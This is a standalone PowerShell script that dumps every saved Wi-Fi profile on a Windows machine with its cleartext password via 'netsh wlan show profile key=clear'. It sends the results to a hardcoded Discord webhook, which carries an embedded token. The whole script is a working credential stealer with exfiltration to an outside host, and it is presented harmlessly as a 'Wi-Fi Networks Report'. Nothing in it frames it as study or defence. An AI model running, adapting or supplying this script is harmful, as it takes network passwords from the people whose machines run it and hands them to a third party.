$Webhook="https://discord.com/api/webhooks/1391925819017793566/P6u2qHAbmqSFeu94T1beCpyWBO6khVVdCK66sy8a083xDZqRSyY5w5PDHDciVnh2ImDB"

# Get Wi-Fi profiles more reliably
$profiles = @()
try {
    $rawProfiles = netsh wlan show profile
    foreach ($line in $rawProfiles) {
        if ($line -match 'All User Profile\s*:\s*(.+)') {
            $profiles += $matches[1].Trim()
        }
    }
}
catch {
    $profiles = @()
}

$fields = @()
if ($profiles.Count -eq 0) {
    $fields += @{
        name = "No Wi-Fi profiles found"
        value = "Could not detect any saved Wi-Fi networks on this machine."
        inline = $false
    }
} else {
    foreach ($p in $profiles) {
        try {
            $details = netsh wlan show profile name="$p" key=clear
            $passLine = $details | Select-String "Key Content"
            $securityLine = $details | Select-String "Authentication"
            
            $password = if ($passLine) { 
                ($passLine -split ':')[1].Trim() 
            } else { 
                'Not available' 
            }
            
            $security = if ($securityLine) { 
                ($securityLine -split ':')[1].Trim() 
            } else { 
                'Unknown' 
            }

            # Truncate long profile names for Discord
            $profileName = if ($p.Length -gt 256) { $p.Substring(0,253) + "..." } else { $p }

            $fields += @{
                name = $profileName
                value = "**Password:** `$password`n**Security:** $security"
                inline = $false
            }
        }
        catch {
            $fields += @{
                name = "Error retrieving: $p"
                value = "Failed to get details for this network"
                inline = $false
            }
        }
    }
}

# Create proper Discord embed format
$embed = @{
    title = "📶 Wi-Fi Networks Report"
    description = "Detected saved Wi-Fi networks on this machine"
    color = 3447003
    fields = $fields
    timestamp = Get-Date -Format "yyyy-MM-ddTHH:mm:ss.fffZ"
    footer = @{
        text = "Generated on $(Get-Date)"
    }
}

$payload = @{
    embeds = @($embed)
    username = "Wi-Fi Scanner"
    avatar_url = "https://cdn-icons-png.flaticon.com/512/284/284687.png"
}

try {
    $body = $payload | ConvertTo-Json -Depth 10 -Compress
    Invoke-RestMethod -Uri $Webhook -Method Post -Body $body -ContentType "application/json" -ErrorAction Stop
    Write-Host "✅ Wi-Fi report sent successfully to Discord." -ForegroundColor Green
}
catch {
    Write-Host "❌ Error sending to Discord: $($_.Exception.Message)" -ForegroundColor Red
    Write-Host "Response: $($_.ErrorDetails.Message)" -ForegroundColor Yellow
}
